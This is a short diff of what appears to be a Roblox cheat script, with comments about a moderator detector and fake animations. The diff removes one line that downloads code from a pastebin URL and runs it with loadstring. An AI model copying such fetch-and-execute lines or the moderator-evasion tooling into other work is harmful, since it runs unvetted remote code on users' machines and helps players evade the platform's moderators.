@@ -4,9 +4,7 @@
 
 -- ADDED MOD DETECTOR !KICKS YOU WHEN A MOD/ADMIN JOINS!
 
---ADDED FAKE ANIMATIONS++
 
-loadstring(game:HttpGet("https://pastebin.com/raw/EzbFjLYb",true))()
 -- diff
 
 getgenv().DNS = {
